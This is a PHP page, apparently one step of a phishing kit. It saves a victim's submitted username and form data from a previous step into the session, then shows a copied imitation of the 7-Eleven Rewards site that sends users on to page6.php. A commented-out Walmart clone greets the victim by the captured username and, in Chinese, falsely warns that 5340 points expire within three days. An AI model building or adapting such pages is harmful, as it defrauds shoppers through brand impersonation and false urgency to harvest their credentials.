<?php
session_start();
// include('partials/header.php');

include('header-new.php');


if (isset($_POST['username']) && $_POST['username']!="") {
   $_SESSION['step1Data'] = $_POST;
}
//echo "<pre>";print_r($_SESSION);exit;

?>
<style>
   .wraps {
      /*        padding: 30px 20px;*/
      margin-top: 70px;
      padding-bottom: 0px;
   }

   a.main-logo {
      display: block;
      margin: 11px 0 25px 0;
      text-align: center;
      color: red;
      font-size: 19px;
      font-weight: bold;
   }

   .notice {
      line-height: 2;
      padding: 10px;
      border-radius: 5px;
      color: #777977;
      margin: 0px;
      background: #f0f0eb;
   }

   span.inner-pages2 {
      font-weight: unset !important;
      padding-top: 2px;
   }

   @media(max-width: 767px) {
      .submit-btn {
         text-align: center;
         background-color: #0071dc;
         padding: 11px 24px;
         font-size: 1rem;
         display: block;
         width: auto;
         min-width: 120px;
         margin-left: auto;
         margin-right: auto;
         line-height: 22px;
         border-radius: 32px;
         color: #fff;
         border-color: #0071dc;
         height: auto;
         cursor: pointer;
      }

      .submit-btn:hover:hover {
         background-color: #0071dc;
         border-color: #0071dc;
      }

      .loader-wrap {
         display: flex;
         width: 100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         align-items: center;
         justify-content: center;
         z-index: 99999999999999;
         background: rgba(255, 255, 255, 1);
      }

      .loader-wrap .loading {
         display: flex;
         flex-direction: column;
         align-items: center;
      }

      .loader-wrap .loading img.china-mobile-logo-img {
         width: 200px;
      }

      .loader-wrap .loading img {
         width: 80px;
      }
   }
</style>

<style>
   .container-1 {
      padding: 0px 10px;
      padding-top: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      background-color: #147350;
      color: white;
      text-align: center;
   }

   .large-font {
      font-style: 28px
   }

   .small-font {
      font-size: 14px;
   }

   .c-btn {
      font-size: 15px;
      font-weight: 900;
      background-color: rgb(255 200 30);
      color: black;
      border: 1px solid black;
      border-radius: 50px;
      box-shadow: 5px 5px;
      padding: 10px 45px;
   }

   .container-list {
      background-color: black;
      font-weight: bolder;
      font-size: 16px;
      display: flex;
      align-items: center;
      flex-direction: column;
      gap: 30px;
      text-align: center;
      padding: 15px;
      list-style: none !important;
   }

   .container-list li {
      color: white !important;
      list-style: none !important;
   }

   .container-2 {
      display: flex;
      align-items: center;
      flex-direction: column;

      gap: 30px;
      text-align: center;

      font-size: 14px
   }

   .c2-btn {
      padding: 10px 20px;
      border-radius: 50px;
      font-size: 15px;

      background-color: #147350;
      color: white;


   }

   .divider-1 {
      margin: 10px 0px;
      margin-top: 40px;
      border: 1px gray solid;
      width: 100%;
   }


   .accordion-1 {
      cursor: pointer;
      /* margin: 10px 30px; */
      padding: 10px 0px;
      border: none;
      text-align: left;
      outline: none;
      font-size: 15px;
      font-weight: 900;
      transition: 0.4s;
      width: 100%;
      background-color: white;
      display: flex;
      align-items: center;
      justify-content: space-between;
   }

   .accordion-1:hover {
      text-decoration: underline;
   }

   .panel-1 {
      padding: 0px 0px;
      display: none;
      overflow: hidden;
   }

   .panel-1 p {
      margin: 5px 0px;
      font-size: 11px;
   }
</style>

<div>

   <div class="container-1">
      <img src="<?php echo $folder_path;?>/images/RewardsPage-Logo-TEST.webp" style="width: 354; height: 95" alt="">
      <div class="large-font">Get the 7-Eleven app. Reap the rewards.</div>
      <div class="small-font">7-Eleven Rewards has exclusive deals that earn you points on nearly every dollar you spend. Redeem points for free snacks and goodies, get a FREE Slurpee® during our birthday month, boost your savings with Bonus Points, play AR games for additional ways to earn and start a points streak when you purchase select products.</div>
      <div class="small-font">Earning with the 7REWARDS loyalty program is so easy. Start your rewards today.</div>
      <a href="page6.php"><button class="c-btn">Get The App</button></a>
      <img src="<?php echo $folder_path;?>/images/Site2.webp" alt="">
   </div>

   <div>
      <ul class="container-list">
         <li class=" " style="border-bottom: 2px solid orange;">7REWARDS</li>
         <li class=" ">7-Eleven Wallet</li>
         <li class=" ">Fuel Savings</li>
         <li class=" ">Mobile Checkout</li>
      </ul>
   </div>

   <div class="container-2">
      <h2 style="font-weight: bolder; font-size: 20px; padding: 20px 10px;">Membership is a Rewarding Experience</h2>
      <div>
         <img src="<?php echo $folder_path;?>/images/Site2.1.webp" style="height: 245px;" alt="">
         <div>
            <h2 class="" style="">7-Eleven Wallet</h2>
         </div>
         <div class="small-font" style="margin: 20px 0px;">Contactless payment makes checkout a breeze when you pay with your phone. Plus, you'll earn 5X points along the way.</div>
         <button class="c2-btn">Learn More</button>
      </div>
      <div>
         <img src="<?php echo $folder_path;?>/images/Site2.2.webp" style="height: 245px;" alt="">
         <div>
            <h2 class="" style="">7-Eleven Wallet</h2>
         </div>
         <div class="small-font" style="margin: 20px 0px;">Get your motor going when you sign up for Fuel Savings and save 11¢/gal on your first 7 trips.</div>
         <button class="c2-btn">Learn More</button>
      </div>
      <div>
         <img src="<?php echo $folder_path;?>/images/Site2.3.webp" style="height: 245px;" alt="">
         <div>
            <h2 class="" style="">7-Eleven Wallet</h2>
         </div>
         <div class="small-font" style="margin: 20px 0px;">Shop, scan and pay for your items all while earning 10X the points. Another great contactless way to pay.</div>
         <button class="c2-btn">Learn More</button>
      </div>
      <div style="background-color: #147350;color: white; padding:40px;">
         <div style="font-size: 25px; font-weight: 900;">
            Join 7REWARDS
         </div>
         <div class="small-font" style="margin: 20px 0px; color: white;">Sign up or log-in with your existing 7-Eleven account.</div>
         <button class="c2-btn" style="background-color: #fff; color: black; font-weight: 900;">Learn More</button>
      </div>

      <div style="
      padding: 20px;
      text-align: left;
      width: 100%;
      ">
         <div style="font-size: 24px; font-weight: 900;">
            Frequently Asked Questions
         </div>
         <div class="divider-1"></div>
         <div style="font-size: 20px; font-weight: 900;">
            7REWARDS FAQ
         </div>

         <div>

            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>What is 7REWARDS?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p>7REWARDS and the 7-Eleven app lets customers enjoy savings on
                  exclusive deals, earn points with every qualifying purchase and
                  redeem those points on member rewards like free snacks and drinks,
                  and also find their nearest store.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>How does it work?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> When you check out in-store, scan your 7REWARDS barcode or enter the
                  phone number registered to your 7REWARDS account to earn points and
                  member rewards.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>How many points do I earn with each purchase?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p>You immediately earn 10&nbsp;points for every dollar you spend on
                  qualifying purchases; points exclude age-restricted items, fuel, and
                  services.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>How do I redeem points for my member rewards?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> In the 7-Eleven app, choose your reward, tap "redeem", confirm and
                  the points will be deducted from your points balance. Then, grab
                  your selected item and head to the counter. Scan your app barcode or
                  enter your&nbsp;phone number when checking out and the discount will
                  be added at the register.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>Where can I view my available member rewards?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p>In the 7-Eleven app, click on "My Rewards" at the bottom app menu to
                  see rewards you've earned. You can also click on "Deals", right next
                  to "My Rewards", to review even more deals and recommended offers.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>If I select a reward by mistake, how can I get th</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p>Unfortunately, the process of selecting a reward is not reversable.
                  The selected reward will remain within the My Rewards section until
                  it is redeemed or expires (30 days after selection).</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>Is it possible to merge multiple accounts?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> Yes. Go to the
                  <a href="https://www.7-eleven.com/my-7rewards" target="_blank" rel="external noopener noreferrer">profile page</a>
                  and add the phone number you used to create the account. You should
                  receive a prompt to merge the duplicate accounts if you are
                  elligible to merge accounts. Follow the instructions to complete the
                  merge process.
               </p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>How long do my 7REWARDS points last?</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> When you scan your 7REWARDS app, enter your registered telephone
                  number or complete an in-store transaction with your 7REWARDS
                  account at least once every 90 days, your points will not expire. If
                  you do not have any of this activity every 90 days, your points will
                  expire. Remember, all you need to do to prevent this is earn more
                  points, redeem points, or complete a transaction on your 7REWARDS
                  account and you are good!</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>Do I still earn points even if I have not registe</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> Yes! You can always earn points every time you make a purchase at
                  the store, even if it has not been registered yet. Points will
                  expire in two months if the card is not registered.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>How can I confirm my scanned card/barcode registe</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p> You can confirm if your barcode or phone number is registered by
                  checking for your name on the customer messaging tablet when making
                  your purchase, or by reviewing your receipt. If registered,
                  the&nbsp;receipt will state 'Member Transaction' and show the last 4
                  digits of your member ID near the bottom.</p>
            </div>
            <button class="accordion-1" style="border-bottom: 1px solid white !important;">
               <span>Are there limitations with the use of 7REWARDS po</span> <img src="<?php echo $folder_path;?>/images/arrow-btn.svg" style="float: right;" alt=""></button>
            <div class="panel-1">
               <p>
               <p>
                  Points and rewards have no monetary value, may not be redeemed for
                  cash and are not transferrable to any other individual or
                  entity.&nbsp;
               </p>
               <p>
                  Points will not be accumulated on the portion of any transaction
                  that was paid for or credited by using or redeeming My Rewards or
                  other discounts or promotional codes. Points will not be accumulated
                  on purchases of the following products/services: fuel, age
                  restricted items (such as cigarettes, lottery tickets,
                  and&nbsp;alcohol), financial services, prepaid card products, money
                  orders, gift cards, phone cards, stamps, Post Office stamps and
                  merchandise, event tickets, bus tickets and passes, charitable
                  donations, gift with purchases or as may be excluded in a particular
                  promotion, and any other items specified as exclusions from time to
                  time (collectively, the "Excluded Items").
               </p>
               <p>
                  We reserve the right to add or delete products and services eligible
                  for redemption or point collection at any time, at our sole
                  discretion, without notice. Learn more here:
                  <a href="https://www.7-eleven.com/terms" target="_blank" rel="external noopener noreferrer">https://www.7-eleven.com/terms</a>
               </p>
               </p>
            </div>
         </div>

      </div>
   </div>
   <div style="
         padding: 30px 20px;
         background-color: #147350;
         color: white;
         position: relative;
         display: flex;
         ">
      <input type="text" style="padding: 10px 30px; color: white !important; border-bottom: 2px solid white; width: 100%" disabled>
      <div style="position: absolute; left: 20px; top: 40px">
         <svg style="height: 20px; width: 20px" aria-hidden="true" focusable="false" data-prefix="far" data-icon="map-marker-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" data-fa-i2svg="">
            <path fill="currentColor" d="M192 0C85.903 0 0 86.014 0 192c0 71.117 23.991 93.341 151.271 297.424 18.785 30.119 62.694 30.083 81.457 0C360.075 285.234 384 263.103 384 192 384 85.903 297.986 0 192 0zm0 464C64.576 259.686 48 246.788 48 192c0-79.529 64.471-144 144-144s144 64.471 144 144c0 54.553-15.166 65.425-144 272zm-80-272c0-44.183 35.817-80 80-80s80 35.817 80 80-35.817 80-80 80-80-35.817-80-80z"></path>
         </svg>
      </div>
      <div style="position: absolute; right: 20px; top: 40px">
         <svg style="height: 20px; width: 20px" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="long-arrow-right" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg="">
            <path fill="currentColor" d="M254.544 154.427L320.118 220H24c-13.255 0-24 10.745-24 24v24c0 13.255 10.745 24 24 24h296.118l-65.574 65.573c-9.373 9.373-9.373 24.569 0 33.941l16.971 16.971c9.373 9.373 24.569 9.373 33.941 0L440.97 272.97c9.373-9.373 9.373-24.569 0-33.941L305.456 103.515c-9.373-9.373-24.569-9.373-33.941 0l-16.971 16.971c-9.373 9.372-9.373 24.568 0 33.941z"></path>
         </svg>
      </div>
      <div style="position: absolute; left: 50px; top: 40px; color: white; font-weight: 900; font-size: 15px;">
         Store Locator
      </div>
   </div>
</div>

<script>
   var acc = document.getElementsByClassName("accordion-1");
   var i;
   for (i = 0; i < acc.length; i++) {
      acc[i].addEventListener("click", function() {
         this.classList.toggle("active");
         var panel = this.nextElementSibling;
         if (panel.style.display === "block") {
            panel.style.display = "none";
         } else {
            panel.style.display = "block";
         }
      });
   }
</script>
<!-- <div class="wraps">
   <div class="flex-auto relative z-1">
      <div class="main-content mw1280 center" id="maincontent" data-testid="maincontent">
         <div>
            <main class="ph3-l ph4-xl pb4" id="maincontent">
               <div data-testid="flex-container" class="flex undefined flex-column h-100">
                  <div class="h-100 relative">
                     <div data-testid="flex-container" class="flex undefined flex-column h-100">
                        <div class="h-100 relative">
                           <div class="bg-white pl4 pr4" style="width:100%;height:45px;">
                              <div class="notice bg-white" style="font-size:13px;">

                                 <p>Dear Walmart Members：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
                                 <p>
                                    MyLink積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p> 
                                 </br>
                              </div>
                           </div>
                           <section>
                              <div class="ma3" data-testid="skinny-banner">
                                 <div class="w-100">
                                    <div style="height:100px;background:url(https://i5.walmartimages.com/dfw/4ff9c6c9-218f/k2-_a17125dd-0da3-4034-b040-5d9080b4ece2.v1.jpg) no-repeat center" class="flex flex-column items-center justify-center w-100 br3 overflow-hidden contain pv4 ph3">
                                       <div style="max-width:fit-content" class="flex flex-column items-center justify-center">
                                          <div class=""><span class="flex justify-center"><span class="b f1-ns f2-m mb1 f4" style="color:#2E2F32">Your remaining Walmart points are (5340)Earn Walmart Rewards with Walmart</span></span></div>
                                          <span class="inner-pages2" style="color:#2E2F32">Join &amp; save on future Walmart purchases.</span>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </section>
                           <div class="bg-white pl4 pr4" style="width:100%;height:auto;">

                              <div class="center">
                                 <a href="page6.php" class="btn submit-btn">Continue</a>
                              </div>



                           </div>
                           <div class="bg-white pl4 pr4" style="width:100%;height:346px">
                              <div class="b pv2"></div>
                              <div class="w_0Uhy w_QddF w-100 h-82">
                                 <div class="w-88 relative bg-black overflow-hidden" style="height:211px"><iframe id="027c7e5a-26b3-4fd4-ac02-43d3825f153b" class="b--none h-100 absolute w-100 h-inherit" height="0" name="%7B%22config%22%3A%7B%22sfLoadEvent%22%3A%22instant%22%2C%22sfType%22%3A%22ads%22%7D%2C%22data%22%3A%7B%7D%2C%22html%22%3A%22%3Ciframe%20src%3Dhttps%3A%2F%2Fplayer.vimeo.com%2Fvideo%2F749748706%3Fh%3Dbad1cbc4d8%20frameborder%3D%5C%220%5C%22%20allow%3D%5C%22autoplay%3B%20picture-in-picture%5C%22%20allowfullscreen%20style%3D%5C%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3B%5C%22%20title%3Dnull%3E%22%2C%22id%22%3A%22027c7e5a-26b3-4fd4-ac02-43d3825f153b%22%7D" title="Video" sandbox="allow-same-origin allow-scripts allow-top-navigation-by-user-activation allow-forms allow-popups" scrolling="no" src="https://i5.walmartimages.com/dfw/63fd9f59-d6ba/07b8ea82-184c-4ea3-8ac0-5dc1981e40c8/v87/safeframe.html"></iframe></div>
                                 <div style="height:94px;max-height:170px" class="w-100">
                                    <div class="pa3 b">Walmart Rewards</div>
                                    <div class="ph3 pb3">Just add, earn &amp; redeem!</div>
                                 </div>
                              </div>
                           </div>

                           <section class="pv3">
                              <h2 class="w_kV33 w_Sl3f w_mvVb ph3 ph0-l pb1">Earn and redeem rewards</h2>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">In-store with the app</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="In-store with the app"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>1. Using the Walmart app, sign in to your Walmart account where you have added eligible items from the Rewards Center.</p>
                                             <p>2. At checkout, scan the QR code &amp; select how you would prefer to pay.</p>
                                             <p>3. Purchase the associated item.</p>
                                             <p>4. Once you have completed the transaction &amp; purchased the associated items, you have earned your Walmart Rewards. Nothing further is required from you. It may take a few minutes for the earned Walmart Rewards to appear in your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                             <p>5. To redeem on your next store trip, scan the QR code at checkout to select your Walmart Rewards balance to apply to your purchase.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Online</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Online"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>1. On Walmart.com or the Walmart app, sign in to your Walmart account where you have added eligible items.</p>
                                             <p>2. Add the eligible item to your cart.</p>
                                             <p>3. Place your order.</p>
                                             <p>4. You earn Walmart Rewards as soon as your order is delivered or picked up from the store. Nothing further is required from you, but it may take a few minutes for the earned Walmart Rewards to appear in your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                             <p>5. To redeem on your next purchase, choose Walmart Rewards balance at checkout to apply to your purchase.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Forgot to scan?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Forgot to scan?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>To earn Walmart Rewards on eligible items, you can scan your receipt barcode within 7 days of purchase. We will check to make sure you have not already received your Walmart Rewards on that transaction. If not, we will credit your Walmart Rewards balance with the appropriate Walmart Rewards. To do this:</p>
                                             <p>1. Download the Walmart app &amp; sign in to your Walmart account where you have added eligible items.</p>
                                             <p>2. Go to Rewards Center tools &amp; tap "Submit your receipt"</p>
                                             <p>3. Scan the barcode on your store receipt.</p>
                                             <p>To redeem your Walmart Rewards balance you need to scan the Walmart Pay QR code at checkout prior to completing the purchase.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                           </section>
                           <section class="pv3">
                              <h2 class="w_kV33 w_Sl3f w_mvVb ph3 ph0-l pb1">FAQ</h2>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Is Walmart Rewards a credit card?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Is Walmart Rewards a credit card?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>No.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Do saved items expire?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Do saved items expire?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>Yes, saved items have expiration dates &amp; the associated item must be purchased before that expiration date. (see Offer Details for expiration dates).</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Where can I spend my Walmart Rewards balance?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Where can I spend my Walmart Rewards balance?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>You can redeem any Walmart Rewards balance at Walmart.com or in Walmart stores. We do not allow Walmart Rewards to be redeemed for the purchase of the following items or categories of products:</p>
                                             <p>All gift cards, including, but not limited to:</p>
                                             <p>- Walmart and Sam’s Club gift cards</p>
                                             <p>- Any 3rd party gift cards: e.g. Apple, Google, PlayStation, Starbucks, etc.</p>
                                             <p>- Network-branded gift cards (i.e., Visa, Mastercard, AMEX gift cards)</p>
                                             <p>- Re-loadable prepaid cards (e.g. Green Dot, BlueBird)</p>
                                             <p>Prescription-related products, including, but not limited to:</p>
                                             <p>- Prescription products such as prescription pet medications, prescription drugs, and prescription medical supplies</p>
                                             <p>- Prescription co-pays or deductibles</p>
                                             <p>- Health care services provided by Walmart Health or Walmart Health Virtual Care</p>
                                             <p>- Pharmacy purchases submitted to any health benefit program, pharmacy benefit program, insurer or state / federal government health care program</p>
                                             <p>- Optical products and services</p>
                                             <p>Alcoholic beverages</p>
                                             <p>Tobacco</p>
                                             <p>Firearm and ammunition products</p>
                                             <p>Lottery tickets</p>
                                             <p>Financial services, including those offered through Walmart Money Centers (e.g. money transfers, money orders, bill payments)</p>
                                             <p>Membership fees (Walmart+)</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Does my Walmart Rewards balance expire?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Does my Walmart Rewards balance expire?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>No.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Can I earn &amp; redeem Walmart Rewards in the same purchase?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Can I earn &amp; redeem Walmart Rewards in the same purchase?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>Yes. You can earn Walmart Rewards on eligible items &amp; redeem your existing Walmart Rewards balance on the same transaction. However, the Walmart Rewards earned in that transaction can only be applied against future transactions.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Can I use paper coupons &amp; earn Walmart Rewards for the same item?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Can I use paper coupons &amp; earn Walmart Rewards for the same item?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>No. If you use a paper coupon in-store &amp; have also added an eligible item, the paper coupon will be honored, &amp; you will not earn the Walmart Reward for that item in that purchase.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
                              <div class="dark-gray">
                                 <section class="expand-collapse-section nl3-l nr2-l" aria-describedby="delivery-instructions">
                                    <hr aria-hidden="true" class="w_8Gn9">
                                    <div class="expand-collapse-header flex justify-between items-center w-100">
                                       <h3 class="w-100 ma0 pa3 f5 lh-copy normal">Do I forfeit the Walmart Rewards if I return the item?</h3>
                                       <div class="pr2"><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 bw0 bg-white" type="button" aria-expanded="false" aria-label="Do I forfeit the Walmart Rewards  if I return the item?"><i class="ld ld-ChevronDown pa0" style="font-size:1.5rem;vertical-align:-0.25em;width:1.5rem;height:1.5rem;box-sizing:content-box"></i></button></div>
                                    </div>
                                    <div class="w_rNem w__2zm expand-collapse-content" style="height:0;visibility:hidden">
                                       <div class="ph3 pb4 pt1">
                                          <div class="gray">
                                             <p>Yes. When an item that earned Walmart Rewards is returned &amp; the purchase price refunded to you, the Walmart Reward for that item will be reversed &amp; deducted from your Walmart Rewards balance, unless there is another item in your transaction to which the original Walmart Reward could be applied.</p>
                                             <p>If your Walmart Rewards balance is not sufficient to cover the deduction, your balance will be negative. You will not be able to use any future earned Walmart Rewards until you reach a positive Walmart Rewards balance. Earned Walmart Rewards accrue towards your Walmart Rewards balance, which can be found in your Walmart account Wallet &amp; Reward Center.</p>
                                             <p>However, we will never ask you to repay a negative balance.</p>
                                          </div>
                                       </div>
                                    </div>
                                 </section>
                                 <hr aria-hidden="true" class="w_8Gn9">
                              </div>
